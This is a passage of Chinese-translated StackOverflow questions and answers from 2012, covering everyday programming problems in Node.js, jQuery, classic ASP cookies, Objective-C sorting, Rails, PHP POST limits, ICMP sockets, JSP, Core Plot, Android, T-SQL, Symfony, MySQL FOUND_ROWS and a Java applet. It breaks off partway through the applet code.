# StackOverflow 问答 10084000-10084999

# exception - 为什么使用nodejs上传异常

> ID：10084000
> 
> 赞同：1
> 
> 时间：2012-04-10T06:17:31.810
> 
> 标签：exception, node.js

**代码**

```
form.parse(request, function(error, fields, files) {
    console.log('parsing done');

    fs.renameSync(files.upload.path, 'c:/tmp/test.png');
    response.writeHead(200, {'Content-Type': 'text/html'});
    response.write('received image:<br/>');
    response.write('<img src="/show" />');
    response.end();
}); 
```

**异常信息**

返回 binding.rename(pathModule._makeLong(oldPath)),

     错误：ENOENT，在 Object.renameSync(fs.js:330:18) 处没有这样的文件或目录 'C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\esdafdace32323432a3f'

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-29T06:06:00.757

这是因为[`fs.rename()`不能在两个不同的磁盘之间移动文件](https://github.com/joyent/node/issues/2703#issuecomment-3824789)
其他`renameSync`不会创建新文件夹，所以你应该确保`tmp/`它必须存在。您需要在源代码文件夹中创建 tmp 文件夹，然后设置`uploadDir` 如下：

```
var form = new formidable.IncomingForm();
  form.uploadDir = "tmp";
  console.log("about to parse");
  form.parse(request, function(error, fields, files) {
    console.log(files.upload.path);
    try{
        fs.renameSync(files.upload.path, "tmp/test.jpg");
    }catch(e){
        console.log(e);
    }
    response.writeHead(200, {"Content-Type": "text/html"});
    response.write("received image:<br/>");
    response.write("<img src='/show' />");
    response.end();
  }); 
```

# jquery - 在 document.ready 中调用函数

> ID：10084001
> 
> 赞同：3
> 
> 时间：2012-04-10T06:17:45.837
> 
> 标签：jquery

我可以使用“onclick”事件调用 document.ready(function(){ }) 中的函数吗？

```
 document.ready(function(){
      function MyFunction()
                {
                  alert("Hello");
                }
                });

<a href="#" onclick="javascript:MyFunction()"></a> 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-10T06:20:01.843

不，您不能这样做，因为 onclick 处理程序用于`eval()`评估 javascript 表达式并`eval()`期望`MyFunction()`成为全局函数，并且当它在`.ready()`处理程序内部定义时，它不是全局函数，因此`eval()`找不到它。

您可以通过在 ready() 处理程序中定义 MyFunction 使其成为一个全局函数，如下所示：

```
window.MyFunction = function() {...} 
```

但是，最好只使用 jQuery 的事件处理程序而不在 HTML 中指定事件处理程序。

```
<a id="myLink" href="#">Click Me</a>

$(document).ready(function() {
    $("#myLink").click(function() {
        alert("Hello");
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T06:20:29.790

“javascript：”是不必要的。是的，你可以。只要您在可访问的范围（换句话说，全局范围）中定义它。

```
function example() { console.log("Called!"); }

$(document).ready(function() { /* code */ example(); /* code */ });

<a href="#" onclick="example();">Example</a> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T06:23:22.227

如果您试图将代码保持在全局范围之外，则可以执行以下操作：

```
var myApp = {

    myFunction: function() {
        alert("Hello");
    }

};

$(document).ready(function() {
    myApp.myFunction();
}); 
```

但是，您将无法调用匿名函数中定义的任何函数，因为它们都超出范围且不可访问。

所以简而言之，如果该函数在 document.ready 中定义，则不能从 document.ready 外部调用该函数。

# cookies - 在经典 ASP 中设置 HttpOnly 标志

> ID：10084004
> 
> 赞同：1
> 
> 时间：2012-04-10T06:18:10.360
> 
> 标签：cookies, asp-classic, httponly

我正在使用服务器端 Java 脚本应用程序开发传统的经典 ASP，在该应用程序中，我需要在 cookie 上设置 HttpOnly 标志，以使应用程序 cookie 更加安全，以便无法通过脚本访问它们。我已经尝试了几种方法（如下所示），但它似乎不起作用。任何建议，如果可能的话，带有代码示例，如何在使用 java 脚本进行服务器端脚本编写的 ASP 经典应用程序中设置 HttpOnly 标志。

我已经尝试了以下失败：

```
Response.AddHeader("Set-Cookie", "TestC =  Y;HttpOnly");
Response.Cookies("TestC") = "Y;HttpOnly"; 
```

我需要对 IIS6 和 7 都进行编码。

谢谢你的帮助。

# iphone - 如何按字母顺序对带有字典对象的 NSArray 进行排序？

> ID：10084010
> 
> 赞同：5
> 
> 时间：2012-04-10T06:19:05.963
> 
> 标签：iphone, objective-c, ios

> **我有未排序的字典数组，我想根据艺术家姓名对其进行排序。未排序的列表如下：**

```
 {
                artist = "Afro Latin Jazz Orchestra";
                id = 10;
            },
                    {
                artist = "Avey, Bobby";
                id = 17;
            },
                    {
                artist = "American Symphony Orchestra";
                id = 32;
            },
                    {
                artist = "Akpan, Uwem";
                id = 97;
            },
                    {
                artist = "Austin, Ivy ";
                id = 123;
            },
                    {
                artist = "American Theatre Orchestra";
                id = 153;
            },
                    {
                artist = AudraRox;
                id = 171;
            },
                    {
                artist = "Atlas, James";
                id = 224;
            },
                    {
                artist = "Alden, Howard";
                id = 270;
            },
                    {
                artist = Astrograss;
                id = 307;
            },
                    {
                artist = "Adan, Victor";
                id = 315;
            },
                    {
                artist = "Alegria, Gabriel";
                id = 316;
            },
                    {
                artist = "Andersen, Kurt";
                id = 412;
            },
                    {
                artist = Antares;
                id = 420;
            },
                    {
                artist = "Austen, Jane ";
                id = 426;
            },
                    {
                artist = "Acuna, Claudia";
                id = 443;
            },
                    {
                artist = "Akinmusire, Ambrose";
                id = 444;
            },
                    {
                artist = "Anderson, Laurie Halse";
                id = 559;
            },
                    {
                artist = "Alvarez, Javier";
                id = 591;
            },
                    {
                artist = "Alexander, Jane";
                id = 674;
            },
                    {
                artist = "Andy Teirstein";
                id = 695;
            },
                    {
                artist = "Afro-Cuban Jazz Saxtet";
                id = 707;
            },
                    {
                artist = "Aurora ";
                id = 708;
            },
                    {
                artist = "Aurora ";
                id = 709;
            },
                    {
                artist = "August, Gregg ";
                id = 715;
            },
                    {
                artist = "Aldous, Brian";
                id = 777;
            },
                    {
                artist = "Anne Enright";
                id = 1130;
            } 
```

> **并在使用描述符排序后**

```
NSSortDescriptor *sortByName = [NSSortDescriptor sortDescriptorWithKey:@"artist" ascending:YES];
 NSArray *sortDescriptors = [NSArray arrayWithObject:sortByName];
 sortedArray = [artistArray sortedArrayUsingDescriptors:sortDescriptors]; 
```

> **它给出排序数组为**

```
 {
            artist = "Acuna, Claudia";
            id = 443;
        },
            {
            artist = "Adan, Victor";
            id = 315;
        },
            {
            artist = "Afro Latin Jazz Orchestra";
            id = 10;
        },
            {
            artist = "Afro-Cuban Jazz Saxtet";
            id = 707;
        },
            {
            artist = "Akinmusire, Ambrose";
            id = 444;
        },
            {
            artist = "Akpan, Uwem";
            id = 97;
        },
            {
            artist = "Alden, Howard";
            id = 270;
        },
            {
            artist = "Aldous, Brian";
            id = 777;
        },
            {
            artist = "Alegria, Gabriel";
            id = 316;
        },
            {
            artist = "Alexander, Jane";
            id = 674;
        },
            {
            artist = "Alvarez, Javier";
            id = 591;
        },
            {
            artist = "American Symphony Orchestra";
            id = 32;
        },
            {
            artist = "American Theatre Orchestra";
            id = 153;
        },
            {
            artist = "Andersen, Kurt";
            id = 412;
        },
            {
            artist = "Anderson, Laurie Halse";
            id = 559;
        },
            {
            artist = "Andy Teirstein";
            id = 695;
        },
            {
            artist = "Anne Enright";
            id = 1130;
        },
            {
            artist = Antares;
            id = 420;
        },
            {
            artist = Astrograss;
            id = 307;
        },
            {
            artist = "Atlas, James";
            id = 224;
        },
            {
            artist = AudraRox;
            id = 171;
        },
            {
            artist = "August, Gregg ";
            id = 715;
        },
            {
            artist = "Aurora ";
            id = 708;
        },
            {
            artist = "Aurora ";
            id = 709;
        },
            {
            artist = "Austen, Jane ";
            id = 426;
        },
            {
            artist = "Austin, Ivy ";
            id = 123;
        },
            {
            artist = "Avey, Bobby";
            id = 17;
        } 
```

**但它仍然没有完全排序。知道如何使用艺术家姓名按字母顺序对其进行排序。请帮帮我！**

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-10T06:38:40.650

像这样为每个字典值使用 for 循环设置键

```
for(int i =0;i<[Arr count];i++)
{
   [dict setValue:[Arr objectAtIndex:i] forKey:[[Arr objectAtIndex:i] valueForKey:artist]];
} 
```

现在你会得到这样的

```
Acuna, Claudia = {
    artist = "Acuna, Claudia";
    id = 443;
}       
Adan, Victor =  {
    artist = "Adan, Victor";
    id = 315;
}       
Afro Latin Jazz Orchestra =   {
    artist = "Afro Latin Jazz Orchestra";
    id = 10;
}       
Afro-Cuban Jazz Saxtet   {
    artist = "Afro-Cuban Jazz Saxtet";
    id = 707;
}       
Akinmusire, Ambrose =   {
    artist = "Akinmusire, Ambrose";
    id = 444;
}       

NSArray *KeyArr = [dict allKeys];

[KeyArr sortedArrayUsingSelector:@selector(caseInsensitiveCompare:)]; 
```

现在您将在数组中获得排序键，使用此数组，您可以通过使用 alphapet 中的排序键获得排序字典

```
for(int i= 0;i<[dict count];i++)
{
     NSLog("Test val:%@",[dict valueForKay:[keyArr objectAtIndex:i]]);
} 
```

最后你会得到你现在正在寻找的东西..享受这个编码..
如果你有任何疑问，请随时问..

# javascript - 在使用 html 在 ruby on rails 3 中渲染视图时出现问题

> ID：10084011
> 
> 赞同：0
> 
> 时间：2012-04-10T06:19:13.280
> 
> 标签：javascript, jquery, ajax, ruby-on-rails-3

在我的项目中，单击复选框，使用 ajax 调用 getProducts 方法。它获取所有产品详细信息，但出现错误。

在我的 application.js 中是这样的：

```
function getProducts(siteid)
{
    if(document.getElementById("cb_site"+siteid).checked==true)
    {
        var theURL = '/index_s/' + siteid;
            $.ajax({
                url: theURL
            });
    }
} 
```

如果我尝试获取产品详细信息（控制器），例如

```
@products=ProductDetail.where("site_id=?",params[:siteid])
respond_to do |format|
  format.html redirect_to @products.home
  format.js
end 
```

我收到错误

**NoMethodError（未定义的方法 `home' for #）**

如果我这样尝试（产品详细信息控制器）

```
@products=ProductDetail.find_by_site_id(params[:siteid])
respond_to do |format|
  format.html redirect_to @products.home
  format.js
end 
```

我收到这样的错误：

**NoMethodError（未定义的方法 `home' for #）**

如果我这样尝试（product_details 控制器）

```
@products=ProductDetail.all
respond_to do |format|
  format.html redirect_to @products.home
  format.js
end 
```

我收到错误

**#<Array:0xb075138> 的未定义方法“home”**

我有类似 home.html.erb 的观点

```
<div id="product_details">
    <%= render 'index' %>
</div> 
```

在 _index.html.erb 中显示产品

在 index.js.erb

```
$('#product_details').html('<%= escape_javascript render ('index') %>'); 
```

在路由器.rb

```
 match "index_s/:siteid" => 'product_details#index' 
```

请帮助我解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T12:07:08.903

在控制器中做错了。我更改了我的控制器代码，如下所示，我的问题解决了

在 app/controller/product_details

```
def index
    @products=ProductDetail.where("site_id=?",params[:siteid])
end 
```

app/views/product_details/home.html.erb

```
<div id="product_details">
    <%= render 'index' %>
</div> 
```

在 app/views/product_details/_index.html.erb

显示产品详情

在 index.js.erb

```
$('#product_details').html('<%= escape_javascript render ('index') %>'); 
```

# php - PHP/JSON：$_POST 数组接收不完整

> ID：10084014
> 
> 赞同：2
> 
> 时间：2012-04-10T06:19:32.573
> 
> 标签：php, jquery, arrays, json, post

使用 $.post (JQuery) 作为 JSON 数组发布大约 100 行数据。但由于某种原因，并非所有行都被接收到。

数据看起来或多或少是这样的（内容基本上是数字和小字符串）：

```
rows = [["U", "0", "81949", 32 more...], ["U", "0", "81950", 32 more...] ..... ] 
```

我发送数据的方式是：

```
$.post(url+"callback=?", { data : rows }, function(){}, "json"); 
```

如果我回显在本地版本中收到的行数（count（$_POST）），它显示“100”，但在生产服务器上显示“25”（每次都是相同的数量）。

检查 firebug 中的请求详细信息，它正确显示所有 100 已发送。

我虽然它可能是 PHP“post_max_size”值，但我将它设置为“100M”，我认为这已经足够了。

我很确定它必须与服务器设置有关，但我没有想法......在此先感谢。

**更新：**

*   生产服务器有 8GB 内存，大约使用了一半（这不是内存问题）。
*   没有超时（所有过程在大约 3 秒内完成）。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-28T19:04:31.037

已经有一个公认的答案，但对于那些不使用 suhosin 的人来说，问题可能是“max_input_vars” php 设置较低。我的默认设置为 1000，这还不够。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-10T06:52:02.183

您的生产服务器是否使用[suhosin](http://www.hardened-php.net/suhosin/)？Suhosin 通常是限制请求大小的罪魁祸首，包括 GET 和 POST。它们对 POST 和 GET 大小有单独的限制（事实上，我记得一个会影响另一个，因此都必须增加）。

看看你的 phpinfo() ，看看那里是否有关于 suhosin 的信息。

可能影响您的 Suhosin 价值观：

*   suhosin.get.max_vars
*   suhosin.post.max_vars
*   suhosin.request.max_vars

（+它们的值和变量长度的等价物）

此外，如果您正在上传文件，那么这也受到 suhosin 的限制：

*   suhosin.upload.max_uploads（因此默认为 25）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T06:31:40.870

查询数据有一个最大大小 - 请参见[此处](https://stackoverflow.com/questions/812925/what-is-the-maximum-possible-length-of-a-query-string)。问题可能是 2 之一。正在接收部分数据，或者 PHP 在一定数量后删除数据。有关 PHP 中的此设置，请参见[此处](http://www.php.net/manual/en/ini.core.php#ini.post-max-size)。

# sockets - 接收“Destination Unreachable”数据包时不发送 ICMP 回显请求

> ID：10084015
> 
> 赞同：3
> 
> 时间：2012-04-10T06:19:45.073
> 
> 标签：sockets, icmp

我正在开发一个网络管理应用程序，该应用程序使用 ICMP 通过原始 BSD 套接字 ( [`sendto`](http://linux.die.net/man/2/sendto)) 对托管主机执行 ping 操作。

我的问题不是如何做到这一点，事实上它运作良好。我似乎只是在目标主机向管理服务器发送*目的地不可达*消息时遇到问题，而我正在尝试向该主机发送 ICMP 回显请求。

当在管理应用程序中添加主机时，将使用所述 ICMP ping 对其进行测试，同时启动“发现”，使用各自的协议测试主机上的各种端口，例如 SNMP (161) 等需要这样做。

现在，我知道在我不知道它是否存在或响应的主机上执行该“发现”没有多大意义（即它发送了 ICMP 回显回复），但对于这个问题，这是至关重要的。让我们还假设这里讨论的主机实际上是可访问的，并且确实响应 ICMP ping，例如通过命令行`ping`。

“发现”最终会导致一些 ICMP *“目标不可达：端口不可达”*数据包被发送回管理服务器，例如，当目标主机上没有运行 SNMP 代理并且端口 161 实际上无法访问时。

这很好，但由于某种原因，这似乎阻碍了 ICMP 套接字向该主机发送 ICMP 回显请求，这是 ICMP ping 所必需的。由于该请求从未发送过，因此我的应用程序没有得到回复，并且主机将在一段时间后被视为“无法访问”（超时）。

我使用 Wireshark 分析了网络流量，因此我可以看出实际上没有发送到目标主机的 ICMP 回显请求。我工作的应用程序还有一个“状态轮询”功能，可用于“手动”在该主机上执行另一个 ICMP ping。如果在添加主机之后使用它（即不再有*目的地不可达*数据包传入），则发送回显请求没有任何问题。

我对在我上面解释的情况下没有发送 ICMP 回显请求感到困惑。我确实有另一个 ICMP 套接字接收所有传入的 ICMP 数据包（为了对回复做出反应），但它不应该影响发送套接字，不是吗？在我的代码中，没有为*Destination unreachable*消息定义任何反应，它们只是被忽略了，所以我非常确定不是我自己的代码禁用了请求发送。

事实上，`sendto`负责发送请求的函数已执行（通过调试确保这一点），甚至返回成功（发送的字节数），但实际上并未发送数据包。我可以在 Windows 和 Linux 系统上重现此问题，因此我不认为这是任何操作系统问题。

*禁用导致那些无法到达的目的地*消息被发回的“发现”可以让一切再次正常工作，所以我相当肯定是这些消息阻碍了 ICMP 回显请求的发送。我找不到答案的大问题是：**为什么会这样？**

如果需要，我可以提供更多信息，但是，我恐怕不允许在这里发布任何代码，因为这是一个商业产品。不过，代码并没有什么特别之处，只是使用原始 ICMP 套接字发送`TOS=0`和接收 ICMP (IPv4) 数据包。`TTL=64`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-06T06:10:04.590

Dest unreachable 由路由器生成，或者如果您在 localnet 内 ping，它将由 localhost 生成。

我猜你的观察是因为你在本地网络中 ping。生成 ICMP-3 的事实意味着 ARP 查找失败，如果没有 ARP 查找，您实际上无法发送数据包，因为您不知道目标 MAC 地址。这解释了一切。

所以，无论如何，你应该等待一个固定的时间，比如一秒钟，然后声明主机不在那里，无论是否发送数据包都没有关系。

# jsp - java servlet 3.0 空指针转发耶拿查询

> ID：10084016
> 
> 赞同：1
> 
> 时间：2012-04-10T06:19:45.463
> 
> 标签：jsp, servlets, nullpointerexception

我尝试通过servlet和bean将jena查询的数据转发到jsp。当我尝试遍历 jsp.file 中的 bean 时，会发生 NPE。当我在迭代之前检查 not null 时，jsp.file 显示没有内容。

小服务程序

```
 protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    Query query = QueryFactory.read(querySPARQL);
    // String co = request.getParameter("country");
    query = QueryFactory.create(query.toString().replaceAll("\\?country", "a:Netherlands"));

    QueryExecution qexec = QueryExecutionFactory.sparqlService(endpoint,
            query);

    try {
        ResultSet results = qexec.execSelect();
        PlantsBean bean = new PlantsBean(results);
        HttpSession session = request.getSession();
        session.setAttribute("PlantsBean", bean);

    } finally {
        qexec.close();
    }
}

/**
 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
 */
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    doGet(request, response);
} 
```

jsp.文件

```
<%

        PlantsBean pb = (PlantsBean)session.getAttribute("PlantsBean");

        for(PowerPlantInfo ppi : pb) {
    %>
    <tr>

    <td><%=ppi.getFuel() %></td>

    </tr>
    <%
        }
    %>
</table> 
```

错误信息

```
Servlet.service() for servlet [jsp] in context with path [/SemTec1] threw exception   
[java.lang.NullPointerException] with root cause
java.lang.NullPointerException
at org.apache.jsp.te_jsp._jspService(te_jsp.java:107)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:225)
at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:169)
at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927)
at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:999)
at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:565)
at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:307)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
at java.lang.Thread.run(Thread.java:722) 
```

NPE 发生在一行中：for (PowerPlantInfo : ...)。所以 NPE 说，这个 bean 是空的。但这不可能。耶拿查询工作正常。我也试图将 servlet 放在 web-inf/classes 中，但不起作用。昨天，当我再次设置这整个东西时，我第一次在服务器上运行它，它工作了。第二次，不再工作。

我正在使用 tomcat 7、jdk 7 和 servlets 3.0。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T12:10:33.450

您的 Servlet 不会将请求转发给 JSP。所以我猜你正在直接访问 JSP（即`http://yourhost/path/yourfile.jsp`）。

相反，我希望您的 Servlet 重定向到 JSP（使用`request.getRequestDispatcher("yourfile.jsp")`）。当您使用浏览器（即`http://yourhost/path/YourServlet`）访问您的 Servlet 时，您的 Servlet 将运行，最终重定向到 JSP。

# iphone - 如何使用核心图更改散点图一部分的线条颜色？

> ID：10084017
> 
> 赞同：3
> 
> 时间：2012-04-10T06:19:53.837
> 
> 标签：iphone, objective-c, core-plot, scatter-plot

我想知道如何通过在 iPhone 项目上使用核心图来更改部分散点图的线条颜色。例如，如果 Y 轴的当前值 > 之前的值，则线条颜色变为红色，否则线条颜色保持为绿色。下面是我的代码，但我发现部分情节的颜色没有变化，而是整个情节的变化。:(如果有人可以提出一些建议，不胜感激。

```
-(NSNumber *)numberForPlot:(CPTPlot *)plot field:(NSUInteger)fieldEnum recordIndex:(NSUInteger)index 
```

{

```
CPTScatterPlot *myPlot = (CPTScatterPlot *)plot;
CPTMutableLineStyle *lineStyle = [CPTMutableLineStyle lineStyle];
lineStyle.lineWidth              = 3.f;
lineStyle.dashPattern            = [NSArray arrayWithObjects:[NSNumber numberWithFloat:5.0f], [NSNumber numberWithFloat:5.0f], nil];

NSLog(@"index: %d",index);

if(index < 7 && index > 0 && fieldEnum == CPTScatterPlotFieldY){
if ([[dataForPlot objectAtIndex:index] floatValue] > [[dataForPlot objectAtIndex:index-1] floatValue]) {
    //lineStyle.lineColor                = [CPTColor redColor];
    NSLog(@"%f > %f",[[dataForPlot objectAtIndex:index] floatValue],[[dataForPlot objectAtIndex:index-1] floatValue]);
    lineStyle.lineColor = [CPTColor redColor];
    myPlot.dataLineStyle = lineStyle;

}else {
    lineStyle.lineColor              = [CPTColor greenColor];
    myPlot.dataLineStyle = lineStyle;
}
}

if(fieldEnum == CPTScatterPlotFieldX){
    return [NSNumber numberWithInt:index];
}else if(fieldEnum == CPTScatterPlotFieldY){
    return [dataForPlot objectAtIndex:index];
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T00:51:55.273

目前不支持此功能。您必须为要使用的每种颜色/线条样式使用不同的绘图。

# android - 如何在我的 android 应用程序中获得日历的添加/删除提醒功能？

> ID：10084022
> 
> 赞同：0
> 
> 时间：2012-04-10T06:20:14.340
> 
> 标签：android, android-layout, android-widget

我是android开发的新手。在日历的创建事件活动（如 - 和 + 图像按钮）中有用于提醒的添加/删除功能。

我可以按照哪些步骤在我的活动中创建这样的功能？例如，通过单击“-”符号图像按钮，删除（提醒）下拉菜单，通过单击“+”图像按钮，添加新的下拉菜单。

任何形式的帮助将不胜感激。

准确地说：我想创建自己的日历。因此，当我单击“+”按钮时，会打开一个具有日期和时间选择器的新活动。在该屏幕上选择日期和时间后，它将该数据返回到启动（主要）活动。在主要活动中，我希望显示这些日期和时间段，就像在日历的事件活动中显示提醒一样。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:17:36.070

我不太确定你想要什么或需要什么。但是，如果您想动态地将**小部件（视图）**添加到**Layout**，这里有几个选项。一种选择是将要动态添加的**widget(View)**放入单独的布局定义（XML 文件）中。然后，每当您想将此**视图**添加到另一个**布局**时，您都可以使用**LayoutInflater**从 XML创建**视图**的实例。拥有实例后，您可以使用该方法或其任何重载版本轻松将此实例添加到任何**布局。**`addView(View child)`

# tsql - 如何根据 Transact-sql 中的 group-by 子句中的项目设置类别？

> ID：10084025
> 
> 赞同：0
> 
> 时间：2012-04-10T06:20:32.947
> 
> 标签：tsql, group-by, data-warehouse, user-defined-functions

我有一组记录，一旦组合在一起，我想根据该组中记录的组合分配一个类别..

想知道解决这个问题的最佳方法..我能想到的就是我下面的内容，但认为可能有更聪明的方法来做到这一点（也许使用 UDF？）

```
SELECT *
, case when productgroup in ('chihuaha','labrador') then 1 else 0 end AS Dog
, case when productgroup in ('siamese', 'tabby') then 1 else 0 end  as Cat
INTO #tmp_items
FROM dbo.Items

SELECT docket
        , sum(value)
        , case when sum(Dog) > 0 and sum(Cat) > 0 then 'Dog and Cat' 
               when sum(Dog) > 0 and sum(Cat) = 0 then 'Dog Only'
               when sum(Dog) = 0 and sum(Cat) > 0 then 'Cat Only'
          end
          as Purchase_Type 
FROM #tmp_items
GROUP BY docket 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T08:23:13.220

避免临时表等的一种简单方法是在非常简单的 CTE 中执行查询：

```
WITH    tmp_items ( Docket, Value, Dog, Cat )
          AS ( SELECT   Docket ,
                        Value ,
                        CASE WHEN productgroup IN ( 'chihuaha', 'labrador' ) THEN 1
                             ELSE 0
                        END AS Dog ,
                        CASE WHEN productgroup IN ( 'siamese', 'tabby' ) THEN 1
                             ELSE 0
                        END AS Cat
               FROM     dbo.Items
             )
    SELECT  Docket ,
            SUM(Value) ,
            CASE WHEN SUM(Dog) > 0 AND SUM(Cat) > 0 THEN 'Dog and Cat'
                 WHEN SUM(Dog) > 0 AND SUM(Cat) = 0 THEN 'Dog Only'
                 WHEN SUM(Dog) = 0 AND SUM(Cat) > 0 THEN 'Cat Only'
            END AS Purchase_Type
    FROM    tmp_items
    GROUP BY docket 
```

可能需要进行一些调整，因为您尚未提供架构信息和示例数据，但仍然 - 您不得不诉诸于此的事实可能表明您的架构存在问题。例如，我通常希望看到另一个表，将吉娃娃和拉布拉多犬定义为狗，将暹罗猫和虎斑猫定义为猫（几乎是 2 个新实体），而不是在查询中对它们进行硬编码 - 如果它们加入会更好然后计算不为空的地方等。

# php - 在 symfony 2 中存储自定义实用程序和助手的 Symfonian 方式

> ID：10084027
> 
> 赞同：6
> 
> 时间：2012-04-10T06:20:56.380
> 
> 标签：php, symfony, helpers, utilities, project-structure

有时我会编写一些函数或程序作为帮助程序和实用程序，以便在我的所有应用程序中使用......现在我开始使用 Symfony 2，我不知道根据 symfony 2 哲学的最佳方法是什么Bundles...我不希望仅仅为了存储几个函数而创建一个完整的Bundle，但如果这是最好的方法，我会这样做。谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-10T07:28:35.210

如果您的实用程序和帮助程序不是 Symfony 特定的，请在单独的 repo 中创建一个库并使用`deps`with`bin/vendors install`命令或通过[Composer](http://getcomposer.org/)将其安装到供应商，这将成为自 Symfony 2.1 以来管理供应商的默认方式。

如果您希望您的库与 Symfony 无缝集成，请在另一个单独的 repo 中创建一个包并将其安装到供应商。这样，您的库可以在 Symfony 项目之外使用，但在 Symfony 项目中使用时会提供一些便利。

另请参阅一个有点[相关的问题](https://stackoverflow.com/questions/9999433/should-everything-really-be-a-bundle-on-symfony-2/10001019)。

# php - 使用 LIMIT 时获取总行数

> ID：10084029
> 
> 赞同：9
> 
> 时间：2012-04-10T06:21:08.690
> 
> 标签：php, mysql

一直在关注[这里](http://www.arraystudio.com/as-workshop/mysql-get-total-number-of-rows-when-using-limit.html)和许多其他网站的示例，但没有得到预期的结果

我的 PHP 代码片段；

```
$query="SELECT * FROM book";
$result=mysql_query($query);
echo mysql_num_rows($result); //returns 14

$query="SELECT FOUND_ROWS()";
$rtotal=mysql_query($query);
echo mysql_result($rtotal,0); //returns 14

$query="SELECT * FROM book LIMIT 0,4";
$result=mysql_query($query);
echo mysql_num_rows($result); //returns 4

$query="SELECT FOUND_ROWS()";
$rtotal=mysql_query($query);
echo mysql_result($rtotal,0); //returns 4 Why is it 4 and not 14?? 
```

在最后一个例子中，为什么它是 4 而不是 14？我究竟做错了什么？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-10T06:25:29.843

在您的选择语句中添加 SQL_CALC_FOUND_ROWS：http: [//dev.mysql.com/doc/refman/5.5/en/information-functions.html#function_found-rows](http://dev.mysql.com/doc/refman/5.5/en/information-functions.html#function_found-rows)

这会强制 MySQL 对行进行计数，就好像限制语句不存在一样。

```
$query="SELECT SQL_CALC_FOUND_ROWS * FROM book LIMIT 0,4"; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T06:23:46.053

您最近的查询返回 4 行 ( `$query="SELECT * FROM book LIMIT 0,4";`)。

这就是为什么它返回 4 而不是 14。

* * *

引用文档：

> 在最近成功的 SELECT 语句中没有 SQL_CALC_FOUND_ROWS 选项的情况下，FOUND_ROWS() 返回该语句返回的结果集中的行数。如果语句包含 LIMIT 子句，则 FOUND_ROWS() 返回达到限制的行数。

# java - Applet SQL INSERT 在浏览器中不起作用

> ID：10084036
> 
> 赞同：0
> 
> 时间：2012-04-10T06:22:04.103
> 
> 标签：java, sql, eclipse, applet

我有一个小程序，当我在 Eclipse 中测试运行时它运行良好，但是当我进入浏览器时它似乎不起作用。

我已经读过小程序不再使用了，但出于各种原因我仍然想了解它们。

这是我的代码。就像我说的那样，它在 Eclipse 中运行时按预期工作。

```
public class WPStool extends Applet implements ActionListener
{
 /**
     * 
     */
 private static final long serialVersionUID = 6920052961843268403L;
 Label lblCustNum, lblCustName, lblAccount, lblEmpID, lblSuccess;
 TextField txtCustNum, txtCustName, txtAccount, txtEmpID;
 Button bEnter;
 boolean blnCorrect;

 public void init()
 {
     lblCustNum = new Label("Customer #");
  add(lblCustNum);

  txtCustNum = new TextField(20);
  add(txtCustNum);

  lblCustName = new Label("Customer Name");
  add(lblCustName);

  txtCustName = new TextField(20);
  add(txtCustName);

  lblAccount = new Label("Account Type");
  add(lblAccount);

  txtAccount = new TextField(20);
  add(txtAccount);

  lblEmpID = new Label("EmployeeID");
  add(lblEmpID);

  txtEmpID = new TextField(20);
  add(txtEmpID);

  bEnter = new Button("Enter");
  add(bEnter);
  bEnter.addActionListener(this);
 }

 public void actionPerformed(ActionEvent e)
 {

  if (e.getSource() == bEnter)
    {
        //registerUser();
        int custNum = Integer.parseInt(txtCustNum.getText());
        int empID = Integer.parseInt(txtEmpID.getText());
        enterInfo(custNum, txtCustName.getText(), txtAccount.getText(), empID);
        txtCustNum.setText("");
        txtCustName.setText("");
        txtAccount.setText("");
        txtEmpID.setText("");
    }
 }

public void enterInfo(int custNuma, String custNamea, String accounta, int empIDa)
{
